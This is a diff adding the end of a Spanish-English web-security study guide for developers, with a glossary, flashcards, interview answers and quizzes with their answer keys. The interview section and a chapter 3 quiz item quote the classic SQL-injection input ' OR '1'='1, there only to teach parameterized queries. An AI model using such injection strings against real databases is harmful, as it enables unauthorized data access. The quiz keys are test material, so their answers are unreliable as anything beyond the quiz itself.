+      <button onclick="saveStudyDay()" class="bg-red-600 text-white font-semibold px-6 py-2 rounded-xl hover:bg-red-700 transition">Guardar</button>
+      <span id="saveMsg" class="ml-3 text-sm text-red-600 hidden">¡Guardado!</span>
+    </div>
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">Historial</h2>
+      <div id="studyHistory" class="space-y-2 text-sm"></div>
+      <p id="noHistory" class="text-gray-400 text-sm">No hay registros aún.</p>
+    </div>
+    <div class="mt-8"><button onclick="showChapter(0)" class="text-sm text-gray-500 hover:text-slate-800">← Inicio</button></div>
+  </div>
+</div>
+
+</main>
+<footer class="bg-slate-800 text-white/50 text-center text-xs py-6">Guía de Estudio · Seguridad para Desarrolladores · Conceptos de Programación CP8</footer>
+
+<script>
+// ===== DATA =====
+const glossaryData = [
+  {es:'OWASP',en:'OWASP',def:'Fundación de referencia en seguridad de aplicaciones. Su Top 10 es el mapa mundial de los riesgos web más comunes.'},
+  {es:'Superficie de Ataque',en:'Attack Surface',def:'Todos los puntos por donde un sistema puede ser atacado: endpoints, puertos, dependencias, features olvidadas. Menos = mejor.'},
+  {es:'Defensa en Profundidad',en:'Defense in Depth',def:'Varias capas de protección independientes, como un castillo: si una falla, las demás contienen el daño.'},
+  {es:'Menor Privilegio',en:'Least Privilege',def:'Cada usuario, app y servicio recibe SOLO los permisos que su tarea necesita. Acota el daño de cualquier compromiso.'},
+  {es:'Fallar Seguro',en:'Fail Securely',def:'Ante un error, el sistema queda CERRADO (denegar acceso), y los mensajes no revelan detalles internos al atacante.'},
+  {es:'Validación de Entrada',en:'Input Validation',def:'Verificar tipo, formato, rango y longitud de TODO lo que llega, en el SERVIDOR. La del cliente es solo cortesía.'},
+  {es:'Lista Blanca',en:'Whitelist / Allowlist',def:'Definir qué SÍ se acepta (mejor) en vez de qué se prohíbe (lista negra — siempre se escapa algo).'},
+  {es:'Sanitización',en:'Sanitization',def:'Neutralizar contenido peligroso según su destino: parametrizar para SQL, escapar para HTML.'},
+  {es:'Control de Acceso Roto',en:'Broken Access Control',def:'A01 de OWASP: el usuario puede ver/hacer cosas que no le corresponden. El riesgo #1 actual.'},
+  {es:'IDOR',en:'IDOR — Insecure Direct Object Reference',def:'Cambiar el id en la URL (/pedidos/1002) y acceder a recursos ajenos. Cura: verificar pertenencia en CADA endpoint.'},
+  {es:'Inyección SQL',en:'SQL Injection',def:'Texto del usuario concatenado en una consulta se ejecuta como SQL. Cura total: consultas parametrizadas.'},
+  {es:'Consulta Parametrizada',en:'Parameterized Query',def:'El SQL fijo viaja separado de los datos: la BD nunca interpreta el dato como código. Los ORMs lo hacen por defecto.'},
+  {es:'XSS',en:'XSS — Cross-Site Scripting',def:'Script enviado por un usuario que se ejecuta en el navegador de OTROS al mostrarse sin escapar. Cura: escapar la salida.'},
+  {es:'Escapar la Salida',en:'Output Escaping',def:'Convertir caracteres activos en inofensivos al mostrar (< se vuelve &lt;). Los frameworks modernos lo hacen por defecto.'},
+  {es:'CSP',en:'CSP — Content Security Policy',def:'Header que le dice al navegador de qué orígenes aceptar scripts. Segunda capa contra XSS.'},
+  {es:'CSRF',en:'CSRF — Cross-Site Request Forgery',def:'Un sitio malicioso hace que TU navegador (con tu sesión) envíe peticiones a otro sitio donde estás logueado.'},
+  {es:'Token Anti-CSRF',en:'Anti-CSRF Token',def:'Token secreto único por formulario que el sitio atacante no puede conocer. Sin token válido → rechazo.'},
+  {es:'SameSite',en:'SameSite Cookie',def:'Atributo de cookie que evita enviarla en peticiones nacidas de otros sitios. Refuerzo moderno contra CSRF.'},
+  {es:'HttpOnly',en:'HttpOnly Cookie',def:'Cookie no legible desde JavaScript: aunque haya XSS, la sesión no se roba leyendo document.cookie.'},
+  {es:'HTTPS',en:'HTTPS',def:'HTTP dentro de un túnel TLS: confidencialidad, integridad y autenticidad. Obligatorio, sin excepciones.'},
+  {es:'TLS',en:'TLS — Transport Layer Security',def:'El protocolo de cifrado actual (sucesor de SSL). "Certificado SSL" en realidad se refiere a TLS.'},
+  {es:'Handshake TLS',en:'TLS Handshake',def:'El saludo inicial: verificar el certificado y acordar una llave secreta compartida sin que un espía pueda deducirla.'},
+  {es:'Certificado Digital',en:'Digital Certificate',def:'Documento firmado por una CA que vincula un dominio con su llave pública. El "pasaporte" del servidor.'},
+  {es:'Autoridad Certificadora',en:'CA — Certificate Authority',def:'Entidad en la que los navegadores confían y que firma certificados: Let\'s Encrypt, DigiCert...'},
+  {es:'Let\'s Encrypt',en:'Let\'s Encrypt',def:'CA gratuita y automatizada: certificados que se renuevan solos. Eliminó el pretexto para no usar HTTPS.'},
+  {es:'HSTS',en:'HSTS — HTTP Strict Transport Security',def:'Header que ordena al navegador usar SIEMPRE HTTPS con ese dominio, incluso si el usuario teclea http://.'},
+  {es:'Hombre en el Medio',en:'MITM — Man-in-the-Middle',def:'Atacante que se interpone en la comunicación para leerla o alterarla. TLS lo neutraliza.'},
+  {es:'Secreto',en:'Secret',def:'Credencial de la app: API keys, cadenas de conexión, tokens. Vive en variables de entorno o gestores, NUNCA en el código.'},
+  {es:'Variable de Entorno',en:'Environment Variable',def:'Valor de configuración fuera del código. El archivo .env local va SIEMPRE en el .gitignore.'},
+  {es:'Gestor de Secretos',en:'Secrets Manager / Vault',def:'Key Vault, Secrets Manager, HashiCorp Vault: secretos cifrados, con control de acceso, auditoría y rotación.'},
+  {es:'Rotación de Secretos',en:'Secret Rotation',def:'Cambiar las llaves periódicamente: si una se filtra, su vida útil es corta.'},
+  {es:'Hash',en:'Hash',def:'Huella digital de un solo sentido: no se puede revertir. Lo que se guarda en vez de la contraseña.'},
+  {es:'bcrypt / Argon2',en:'bcrypt / Argon2',def:'Algoritmos de hash LENTOS a propósito para contraseñas: probar millones de combinaciones se vuelve inviable.'},
+  {es:'Salt',en:'Salt',def:'Valor aleatorio único por usuario mezclado antes de hashear: contraseñas iguales → huellas distintas.'},
+  {es:'Fuerza Bruta',en:'Brute Force',def:'Probar contraseñas masivamente. Se frena con hashes lentos, límite de intentos y 2FA.'},
+  {es:'2FA / MFA',en:'Two-Factor Authentication',def:'Segundo factor además de la contraseña (código, app, llave física). Neutraliza el robo de contraseñas.'},
+  {es:'Escaneo de Dependencias',en:'Dependency Scanning',def:'Detectar librerías con vulnerabilidades conocidas (Dependabot, npm audit, pip-audit). Cubre el A06 de OWASP.'},
+  {es:'Pentest',en:'Penetration Testing',def:'Auditoría autorizada donde especialistas intentan vulnerar el sistema para encontrar fallas antes que un atacante real.'}
+];
+
+const flashcards = [
+  {en:'Vulnerability',es:'Vulnerabilidad',def:'A weakness in a system that an attacker could exploit.',pron:'vul-ner-ah-BIL-ih-tee'},
+  {en:'Threat',es:'Amenaza',def:'A potential danger that could exploit a vulnerability.',pron:'thret'},
+  {en:'Least Privilege',es:'Menor Privilegio',def:'Granting only the permissions each task strictly needs.',pron:'leest PRIH-vih-lij'},
+  {en:'Input Validation',es:'Validación de Entrada',def:'Checking type, format, range and length of everything that comes in — on the server.',pron:'IN-put val-ih-DEY-shun'},
+  {en:'SQL Injection',es:'Inyección SQL',def:'User text executed as part of a SQL query. Cured by parameterized queries.',pron:'ES-kyoo-el in-JEK-shun'},
+  {en:'Cross-Site Scripting',es:'XSS',def:'User-submitted scripts executing in other users\' browsers. Cured by output escaping.',pron:'kros-syt SKRIP-ting'},
+  {en:'Encryption',es:'Cifrado',def:'Transforming data so only authorized parties can read it. Reversible with the key.',pron:'en-KRIP-shun'},
+  {en:'Hashing',es:'Hasheo',def:'A one-way fingerprint of data. Passwords are hashed, never encrypted or stored.',pron:'HASH-ing'},
+  {en:'Certificate',es:'Certificado',def:'A CA-signed document binding a domain to its public key — the server\'s passport.',pron:'ser-TIF-ih-kit'},
+  {en:'Handshake',es:'Saludo TLS',def:'The initial exchange that verifies identity and agrees on a shared secret key.',pron:'HAND-sheyk'},
+  {en:'Token',es:'Token',def:'A temporary credential; also the secret value used to block CSRF attacks.',pron:'TOH-ken'},
+  {en:'Breach',es:'Brecha / Filtración',def:'A security incident where data is accessed without authorization.',pron:'breech'},
+  {en:'Audit',es:'Auditoría',def:'Reviewing systems, logs, and access to verify security and compliance.',pron:'AW-dit'},
+  {en:'Patch',es:'Parche',def:'An update that fixes a vulnerability. Unpatched dependencies are OWASP A06.',pron:'pach'},
+  {en:'Salt',es:'Salt',def:'A unique random value mixed into each password before hashing.',pron:'sawlt'}
+];
+
+const interviewQA = [
+  {q:'What is SQL injection and how do you prevent it? / ¿Qué es la inyección SQL y cómo se previene?',cat:'Técnica',
+   ans:'It happens when user input is concatenated into a SQL string, so the input becomes executable SQL — the classic \' OR \'1\'=\'1 returns every row. Prevention is total and simple: parameterized queries — the SQL travels fixed and the values travel separately, so the database never interprets data as code. ORMs parameterize by default; the danger is hand-built query strings.\n\n🇪🇸 Español: Ocurre cuando la entrada del usuario se concatena en el texto SQL, de modo que la entrada se vuelve SQL ejecutable — el clásico \' OR \'1\'=\'1 devuelve todas las filas. La prevención es total y simple: consultas parametrizadas — el SQL viaja fijo y los valores separados, así la base de datos nunca interpreta un dato como código. Los ORMs parametrizan por defecto; el peligro son las consultas armadas a mano con texto.'},
+  {q:'Explain XSS vs CSRF. / Explica XSS vs CSRF.',cat:'Técnica',
+   ans:'XSS: malicious script submitted by a user (a comment) executes in OTHER users\' browsers because the page displayed it without escaping — cure: escape all output (frameworks do it by default; beware raw modes), CSP headers, HttpOnly cookies. CSRF: a malicious site makes YOUR browser send a request to a site where you\'re logged in, riding on your cookies — cure: anti-CSRF tokens and SameSite cookies. Memory trick: XSS runs code IN your page; CSRF sends fake requests FROM another page.\n\n🇪🇸 Español: XSS: un script malicioso enviado por un usuario (un comentario) se ejecuta en el navegador de OTROS usuarios porque la página lo mostró sin escapar — cura: escapar toda la salida (los frameworks lo hacen por defecto; cuidado con los modos "crudos"), headers CSP y cookies HttpOnly. CSRF: un sitio malicioso hace que TU navegador envíe una petición a un sitio donde tienes sesión, aprovechando tus cookies — cura: tokens anti-CSRF y cookies SameSite. Truco: XSS ejecuta código EN tu página; CSRF envía peticiones falsas DESDE otra página.'},
+  {q:'How should passwords be stored? / ¿Cómo se deben guardar las contraseñas?',cat:'Técnica',
+   ans:'Never stored — hashed. Use a deliberately SLOW algorithm (bcrypt or Argon2) with a unique salt per user; fast hashes like MD5/SHA-1 are unsuitable because they enable brute force. At login you hash the attempt and compare fingerprints. Complement with rate limiting on login, generic error messages, and 2FA. If the database leaks, there are no passwords to read.\n\n🇪🇸 Español: Nunca se guardan — se hashean. Usa un algoritmo LENTO a propósito (bcrypt o Argon2) con salt único por usuario; los hashes rápidos como MD5/SHA-1 no sirven porque facilitan la fuerza bruta. En el login se hashea el intento y se comparan huellas. Complementa con límite de intentos, mensajes de error genéricos y 2FA. Si la base se filtra, no hay contraseñas que leer.'},
+  {q:'What does HTTPS actually protect? / ¿Qué protege realmente HTTPS?',cat:'Conceptual',
+   ans:'Three things, via TLS: confidentiality (nobody on the path can read the traffic — not the café wifi, not the ISP), integrity (tampering is detected), and authenticity (the certificate, signed by a trusted CA, proves you\'re talking to the real domain). What it does NOT protect: vulnerabilities inside your app — HTTPS with SQL injection is still hackable, just over an encrypted channel.\n\n🇪🇸 Español: Tres cosas, mediante TLS: confidencialidad (nadie en el camino puede leer el tráfico — ni el wifi del café ni el proveedor), integridad (cualquier alteración se detecta) y autenticidad (el certificado, firmado por una CA confiable, prueba que hablas con el dominio real). Lo que NO protege: las vulnerabilidades dentro de tu app — HTTPS con inyección SQL sigue siendo hackeable, solo que por un canal cifrado.'},
+  {q:'A developer committed an API key to the repo. What now? / Un dev commiteó una API key al repo. ¿Ahora qué?',cat:'Comportamental',
+   ans:'Revoke the key IMMEDIATELY — that\'s the first move, because deleting the file doesn\'t remove it from Git history and scanning bots find leaked keys within minutes. Then: issue a new key, audit usage logs during the exposure window, and add the missing barrier (secrets in env vars/vault, pre-commit scanners like gitleaks). Blamelessly: fix the system, not the person.\n\n🇪🇸 Español: Revocar la llave INMEDIATAMENTE — ese es el primer paso, porque borrar el archivo no la saca del historial de Git y los bots que escanean repos encuentran llaves filtradas en minutos. Después: emitir una nueva, auditar los logs de uso durante la ventana de exposición, y agregar la barrera que faltó (secretos en variables de entorno o gestor, escáneres pre-commit como gitleaks). Sin culpas: se arregla el sistema, no a la persona.'},
+  {q:'What is the principle of least privilege? / ¿Qué es el principio de menor privilegio?',cat:'Conceptual',
+   ans:'Every user, app, and service gets ONLY the permissions its task requires — nothing more. The read-only API doesn\'t get DELETE permissions; the intern doesn\'t get production access; the app\'s DB user can\'t drop tables. Value: when (not if) something is compromised, the damage stays contained. It applies everywhere: database users, cloud IAM, API scopes, file permissions.\n\n🇪🇸 Español: Cada usuario, app y servicio recibe SOLO los permisos que su tarea requiere — nada más. La API de solo lectura no recibe permisos de DELETE; el becario no tiene acceso a producción; el usuario de BD de la app no puede tirar tablas. El valor: cuando (no "si") algo se compromete, el daño queda contenido. Aplica en todos lados: usuarios de BD, IAM de la nube, scopes de APIs, permisos de archivos.'},
+  {q:'What is broken access control / IDOR? / ¿Qué es el control de acceso roto / IDOR?',cat:'Técnica',
+   ans:'OWASP\'s current #1. The classic form is IDOR: your endpoint is /orders/1001 and changing the number to 1002 shows SOMEONE ELSE\'s order. Being logged in isn\'t enough — the fix is verifying on EVERY endpoint that the requested resource belongs to the authenticated user (authorization, not just authentication). It\'s a logic bug, so scanners rarely catch it; code review does.\n\n🇪🇸 Español: El #1 actual de OWASP. La forma clásica es IDOR: tu endpoint es /pedidos/1001 y al cambiar el número a 1002 se ve el pedido de OTRA persona. Estar logueado no basta — la cura es verificar en CADA endpoint que el recurso solicitado pertenece al usuario autenticado (autorización, no solo autenticación). Es un bug de lógica, así que los escáneres rara vez lo detectan; el code review sí.'},
+  {q:'How do you keep dependencies secure? / ¿Cómo mantienes seguras las dependencias?',cat:'Técnica',
+   ans:'Your app is as secure as its oldest library (OWASP A06). Practices: automated scanning (Dependabot on GitHub, npm audit, pip-audit) that opens PRs for vulnerable versions, updating regularly in small doses instead of giant risky jumps, and being deliberate about ADDING dependencies — every package is attack surface and a supply-chain risk. Fewer, well-maintained dependencies beat many abandoned ones.\n\n🇪🇸 Español: Tu app es tan segura como su librería más vieja (A06 de OWASP). Prácticas: escaneo automatizado (Dependabot en GitHub, npm audit, pip-audit) que abre PRs ante versiones vulnerables, actualizar seguido y en dosis pequeñas en vez de saltos gigantes y riesgosos, y ser deliberada al AGREGAR dependencias — cada paquete es superficie de ataque y un riesgo de cadena de suministro. Pocas dependencias bien mantenidas ganan a muchas abandonadas.'}
+];
+
+const quizData = {
+  1:[{q:'La regla #1 de seguridad es...',opts:['Usar HTTPS','NUNCA confiar en lo que llega del cliente','Tener antivirus','Cambiar contraseñas'],ans:1},
+     {q:'La validación del frontend (navegador) es...',opts:['Suficiente','Cortesía/UX: la validación de SEGURIDAD va en el servidor','Innecesaria','La única que importa'],ans:1},
+     {q:'"Defensa en profundidad" significa...',opts:['Una sola capa muy fuerte','Varias capas independientes: si una falla, las demás contienen el daño','Cavar profundo','Cifrar dos veces'],ans:1},
+     {q:'El principio de menor privilegio dice que...',opts:['Todos son admin','Cada quien recibe SOLO los permisos que su tarea necesita','Nadie tiene permisos','Los permisos se comparten'],ans:1},
+     {q:'"Fallar de forma segura" implica que ante un error...',opts:['Se concede el acceso','El sistema queda CERRADO y el error no revela detalles internos','Se reinicia todo','Se avisa al atacante'],ans:1},
+     {q:'La pregunta que distingue al senior es...',opts:['"¿Funciona?"','"¿Y si alguien lo usa MAL a propósito?"','"¿Es bonito?"','"¿Cuánto cuesta?"'],ans:1}],
+  2:[{q:'El OWASP Top 10 es...',opts:['Un ranking de lenguajes','La lista de referencia de los riesgos más comunes en apps web','Un framework','Un antivirus'],ans:1},
+     {q:'El riesgo #1 actual (A01) es...',opts:['Inyección','Broken Access Control: usuarios haciendo/viendo lo que no les corresponde','XSS','Contraseñas débiles'],ans:1},
+     {q:'Cambiar /pedidos/1001 por /pedidos/1002 y ver el pedido de otro es...',opts:['Un feature','IDOR: referencia directa insegura','CSRF','Un error 500'],ans:1},
+     {q:'La cura del IDOR es...',opts:['Ocultar las URLs','Verificar en cada endpoint que el recurso pertenece al usuario autenticado','Usar números más grandes','HTTPS'],ans:1},
+     {q:'A06 (Vulnerable Components) se refiere a...',opts:['Hardware viejo','Dependencias con vulnerabilidades conocidas sin actualizar','Monitores rotos','CSS desactualizado'],ans:1},
+     {q:'Mostrar el stack trace completo al usuario es un ejemplo de...',opts:['Buena UX','Security Misconfiguration: información servida al atacante','Debugging profesional','Transparencia'],ans:1}],
+  3:[{q:'La inyección SQL ocurre cuando...',opts:['La BD es vieja','El texto del usuario se CONCATENA en la consulta y se ejecuta como SQL','Hay muchos usuarios','Falta un índice'],ans:1},
+     {q:'¿Qué logra la entrada: ana\' OR \'1\'=\'1 en una consulta vulnerable?',opts:['Nada','La condición siempre es verdadera: devuelve TODAS las filas','Un error de sintaxis','Borra la tabla siempre'],ans:1},
+     {q:'La cura definitiva de la inyección SQL es...',opts:['Prohibir apóstrofes','Consultas parametrizadas: el dato viaja separado del SQL','Limitar la longitud','Cifrar la BD'],ans:1},
+     {q:'Los ORMs ayudan contra la inyección porque...',opts:['Son más rápidos','Parametrizan automáticamente las consultas','Ocultan la BD','Usan NoSQL'],ans:1},
+     {q:'Validar con lista blanca significa...',opts:['Prohibir palabras malas','Definir qué SÍ se acepta y rechazar todo lo demás','Aceptar todo','Revisar a mano'],ans:1},
+     {q:'El cómic de "Little Bobby Tables" enseña que...',opts:['Los niños no deben programar','Hay que sanitizar/parametrizar las entradas a la base de datos','SQL es obsoleto','Las escuelas no usan BDs'],ans:1}],
+  4:[{q:'En un ataque XSS, el script malicioso se ejecuta en...',opts:['El servidor','El navegador de OTROS usuarios que ven la página','La base de datos','El router'],ans:1},
+     {q:'La cura principal del XSS es...',opts:['Prohibir comentarios','Escapar la salida: el script se muestra como texto inofensivo','Usar HTTP','Contraseñas fuertes'],ans:1},
+     {q:'El peligro en frameworks modernos son los "modos crudos" como...',opts:['print()','innerHTML, Html.Raw, |safe con contenido no confiable','console.log','los comentarios'],ans:1},
+     {q:'El CSRF abusa de que...',opts:['Las contraseñas son débiles','El navegador envía tus cookies automáticamente a donde estés logueada','El servidor es lento','El DNS falla'],ans:1},
+     {q:'Las dos curas del CSRF son...',opts:['Antivirus y firewall','Tokens anti-CSRF y cookies SameSite','HTTPS y DNS','Backups y logs'],ans:1},
+     {q:'XSS vs CSRF en corto:',opts:['Son lo mismo','XSS ejecuta código EN tu página; CSRF envía peticiones falsas DESDE otra página','CSRF es de escritorio','XSS es de bases de datos'],ans:1}],
+  5:[{q:'HTTP plano es como...',opts:['Un sobre lacrado','Una tarjeta postal: cualquiera en el camino puede leerla y modificarla','Una caja fuerte','Un telegrama'],ans:1},
+     {q:'TLS garantiza...',opts:['Velocidad','Confidencialidad, integridad y autenticidad','Que no haya bugs','Uptime'],ans:1},
+     {q:'La relación SSL/TLS es...',opts:['Son competidores','SSL es el nombre viejo (obsoleto); TLS es el protocolo actual','TLS es más viejo','No se relacionan'],ans:1},
+     {q:'El certificado del servidor está firmado por...',opts:['El dueño del sitio','Una Autoridad Certificadora (CA) en la que el navegador confía','Microsoft','El gobierno'],ans:1},
+     {q:'Let\'s Encrypt hizo que los certificados fueran...',opts:['Más caros','Gratis y con renovación automática','Obsoletos','Solo para bancos'],ans:1},
+     {q:'HTTPS NO te protege de...',opts:['Espías en el wifi','Vulnerabilidades dentro de tu app, como una inyección SQL','Modificación en tránsito','Impostores del dominio'],ans:1}],
+  6:[{q:'Una API key hardcodeada y commiteada a Git...',opts:['Está segura si el repo es privado','Queda en el historial para siempre y los bots la encuentran en minutos','Se borra sola','No es un secreto'],ans:1},
+     {q:'El archivo .env debe estar...',opts:['En el repositorio','En el .gitignore (verificado)','En el escritorio','En un correo'],ans:1},
+     {q:'Un gestor de secretos (Key Vault, Secrets Manager) agrega sobre el .env...',opts:['Nada','Cifrado central, control de acceso, auditoría y rotación','Más velocidad','Interfaz bonita'],ans:1},
+     {q:'Las contraseñas de usuarios se guardan...',opts:['Cifradas','Nunca: se guarda su HASH (bcrypt/Argon2 con salt)','En texto plano con permisos','En otra tabla'],ans:1},
+     {q:'bcrypt es lento A PROPÓSITO para...',opts:['Molestar','Hacer inviable probar millones de contraseñas por segundo','Ahorrar energía','Compatibilidad'],ans:1},
+     {q:'Si un secreto se filtró, el PRIMER paso es...',opts:['Investigar con calma','REVOCARLO inmediatamente','Borrar el commit','Cambiar de repo'],ans:1}]
+};
+
+// ===== RENDER =====
+function setLang(lang){
+  localStorage.setItem('cp_lang',lang);
+  document.querySelectorAll('.code-wrap').forEach(w=>{
+    w.querySelectorAll('.ct-btn').forEach(b=>b.classList.toggle('ct-active',b.dataset.lang===lang));
+    w.querySelectorAll('.code-block').forEach(p=>{if(!p.classList.contains('code-single'))p.classList.toggle('hidden',!p.classList.contains('code-'+lang));});
+  });
+}
+
+function showChapter(n){
+  document.querySelectorAll('.chapter').forEach(c=>c.classList.remove('active'));
+  document.getElementById('ch'+n).classList.add('active');
+  document.querySelectorAll('.nav-link').forEach(l=>l.classList.remove('active-nav'));
+  const b=document.querySelector('.nav-link[data-ch="'+n+'"]');
+  if(b)b.classList.add('active-nav');
+  window.scrollTo({top:0,behavior:'smooth'});
+  if(n===10)loadStudyData();
+}
+function closeMob(){document.getElementById('mobileMenu').classList.add('hidden');}
+
+function renderQuizzes(){
+  for(let ch=1;ch<=6;ch++){
+    const c=document.getElementById('quiz'+ch+'Questions');
+    if(!c)continue;
+    c.innerHTML=quizData[ch].map((q,i)=>
+      '<div class="mb-6"><p class="font-semibold text-gray-800 mb-3">'+(i+1)+'. '+q.q+'</p><div class="space-y-2">'+
+      q.opts.map((o,j)=>'<label class="quiz-option flex items-center gap-3 p-3 rounded-lg border border-gray-200 cursor-pointer hover:border-gray-400" data-ch="'+ch+'" data-q="'+i+'" data-opt="'+j+'"><input type="radio" name="q'+ch+'_'+i+'" value="'+j+'" class="accent-red-600"><span class="text-sm">'+o+'</span></label>').join('')+
+      '</div></div>'
+    ).join('');
+  }
+}
+
+function gradeQuiz(ch){
+  const qs=quizData[ch]; let correct=0;
+  qs.forEach((q,i)=>{
+    const sel=document.querySelector('input[name="q'+ch+'_'+i+'"]:checked');
+    const labels=document.querySelectorAll('label[data-ch="'+ch+'"][data-q="'+i+'"]');
+    labels.forEach(l=>{l.classList.remove('correct','incorrect');});
+    if(sel){
+      const v=parseInt(sel.value);
+      if(v===q.ans){correct++;sel.closest('label').classList.add('correct');}
+      else{sel.closest('label').classList.add('incorrect');if(labels[q.ans])labels[q.ans].classList.add('correct');}
+    }
+  });
+  const pct=Math.round(correct/qs.length*100);
+  const r=document.getElementById('quiz'+ch+'Result');
+  r.classList.remove('hidden');
+  const pass=pct>=70;
+  r.innerHTML='<div class="p-4 rounded-xl '+(pass?'bg-green-50 border border-green-200':'bg-red-50 border border-red-200')+'"><p class="font-bold '+(pass?'text-green-700':'text-red-700')+' text-lg">'+correct+'/'+qs.length+' — '+pct+'%</p><p class="text-sm '+(pass?'text-green-600':'text-red-600')+'">'+(pass?'¡Aprobado! 🎉':'Necesitas 70% para aprobar. Revisa el material.')+'</p></div>';
+  const scores=JSON.parse(localStorage.getItem('cp8_scores')||'{}');
+  scores[ch]={correct,total:qs.length,pct,passed:pass};
+  localStorage.setItem('cp8_scores',JSON.stringify(scores));
+  updateProgress();
+}
+
+function updateProgress(){
+  const scores=JSON.parse(localStorage.getItem('cp8_scores')||'{}');
+  let passed=0; for(let i=1;i<=6;i++)if(scores[i]&&scores[i].passed)passed++;
+  const pct=Math.round(passed/6*100);
+  document.getElementById('globalProgress').style.width=pct+'%';
+  document.getElementById('globalProgressText').textContent=pct+'%';
+}
+
+function renderGlossary(){
+  const grid=document.getElementById('glossGrid');
+  grid.innerHTML=glossaryData.map((t,i)=>
+    '<div class="gloss-item bg-white rounded-xl shadow p-5"><div class="flex justify-between items-start mb-2"><h4 class="font-bold text-slate-800">'+t.es+'</h4><span class="text-xs bg-red-100 text-red-700 px-2 py-0.5 rounded-full font-mono">'+t.en+'</span></div><p class="text-sm text-gray-600">'+t.def+'</p></div>'
+  ).join('');
+}
+function filterGloss(){
+  const q=document.getElementById('glossSearch').value.toLowerCase();
+  document.querySelectorAll('.gloss-item').forEach((el,i)=>{
+    const t=glossaryData[i];
+    el.style.display=(t.es.toLowerCase().includes(q)||t.en.toLowerCase().includes(q)||t.def.toLowerCase().includes(q))?'':'none';
+  });
+}
+
+function renderFlashcards(){
+  const grid=document.getElementById('flashcardsGrid');
+  grid.innerHTML=flashcards.map((f,i)=>
+    '<div class="flashcard" onclick="this.classList.toggle(\'flipped\')" title="Clic para voltear">'+
+    '<div class="fc-inner">'+
+    '<div class="fc-front bg-red-600 text-white">'+
+      '<p class="text-xs text-red-200 mb-1">🇺🇸 Inglés — haz clic para ver definición</p>'+
+      '<h3 class="text-lg font-black">'+f.en+'</h3>'+
+      '<p class="text-red-200 text-sm mt-1">🇪🇸 '+f.es+'</p>'+
+      '<p class="text-xs text-red-300 mt-2 italic">🔊 '+f.pron+'</p>'+
+    '</div>'+
+    '<div class="fc-back bg-slate-800 text-white">'+
+      '<p class="text-xs text-gray-400 mb-2 uppercase">Definition</p>'+
+      '<p class="text-sm text-gray-200">'+f.def+'</p>'+
+    '</div>'+
+    '</div></div>'
+  ).join('');
+}
+
+function renderInterviewAccordion(){
+  const div=document.getElementById('interviewAccordion');
+  const catColors={Conceptual:'bg-red-100 text-red-800',Técnica:'bg-blue-100 text-blue-800',Comportamental:'bg-orange-100 text-orange-800'};
+  div.innerHTML=interviewQA.map((item,i)=>
+    '<div class="acc-item bg-white rounded-xl shadow overflow-hidden">'+
+    '<button class="w-full flex items-center justify-between p-5 text-left hover:bg-gray-50 transition" onclick="this.closest(\'.acc-item\').classList.toggle(\'open\')">'+
+    '<div class="flex items-start gap-3"><span class="inline-block '+(catColors[item.cat]||'bg-gray-100 text-gray-700')+' text-xs px-2 py-0.5 rounded-full font-semibold flex-shrink-0 mt-0.5">'+item.cat+'</span>'+
+    '<span class="font-semibold text-sm text-slate-800">'+item.q+'</span></div>'+
+    '<svg class="acc-arrow w-5 h-5 text-gray-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>'+
+    '</button>'+
+    '<div class="acc-body"><div class="px-5 pb-5 text-sm text-gray-600 whitespace-pre-line border-t border-gray-100 pt-4">'+item.ans+'</div></div>'+
+    '</div>'
+  ).join('');
+}
+
+function saveStudyDay(){
+  const checks=document.querySelectorAll('.study-check:checked');
+  if(!checks.length)return;
+  const chapters=Array.from(checks).map(c=>parseInt(c.value));
+  const today=new Date().toISOString().split('T')[0];
+  const log=JSON.parse(localStorage.getItem('cp8_log')||'[]');
+  const idx=log.findIndex(e=>e.date===today);
+  if(idx>=0)log[idx].chapters=[...new Set([...log[idx].chapters,...chapters])];
+  else log.push({date:today,chapters});
+  localStorage.setItem('cp8_log',JSON.stringify(log));
+  document.getElementById('saveMsg').classList.remove('hidden');
+  setTimeout(()=>document.getElementById('saveMsg').classList.add('hidden'),2000);
+  loadStudyData();
+}
+
+function loadStudyData(){
+  const log=JSON.parse(localStorage.getItem('cp8_log')||'[]');
+  const scores=JSON.parse(localStorage.getItem('cp8_scores')||'{}');
+  document.getElementById('statDays').textContent=log.length;
+  let streak=0;const today=new Date();
+  for(let i=0;i<365;i++){const d=new Date(today);d.setDate(d.getDate()-i);if(log.some(e=>e.date===d.toISOString().split('T')[0]))streak++;else if(i>0)break;}
+  document.getElementById('statStreak').textContent=streak;
+  let passed=0,totalPct=0,count=0;
+  for(let i=1;i<=6;i++)if(scores[i]){count++;totalPct+=scores[i].pct;if(scores[i].passed)passed++;}
+  document.getElementById('statChapters').textContent=passed+'/6';
+  document.getElementById('statAvg').textContent=count>0?Math.round(totalPct/count)+'%':'—';
+  const h=document.getElementById('studyHistory'),nh=document.getElementById('noHistory');
+  if(!log.length){nh.classList.remove('hidden');h.innerHTML='';return;}
+  nh.classList.add('hidden');
+  h.innerHTML=[...log].sort((a,b)=>b.date.localeCompare(a.date)).slice(0,30).map(e=>
+    '<div class="flex items-center justify-between bg-gray-50 rounded-lg px-4 py-3"><span class="font-semibold text-slate-800">'+e.date+'</span>'+
+    '<div class="flex flex-wrap gap-1">'+e.chapters.sort().map(c=>'<span class="bg-red-100 text-red-700 text-xs px-2 py-0.5 rounded-full">Módulo '+c+'</span>').join('')+'</div></div>'
+  ).join('');
+  const ts=new Date().toISOString().split('T')[0];
+  const te=log.find(e=>e.date===ts);
+  if(te)document.querySelectorAll('.study-check').forEach(cb=>{if(te.chapters.includes(parseInt(cb.value)))cb.checked=true;});
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  renderQuizzes();
+  renderGlossary();
+  renderFlashcards();
+  renderInterviewAccordion();
+  updateProgress();
+  setLang(localStorage.getItem('cp_lang')||'py');
+});
+</script>
+</body>
+</html>
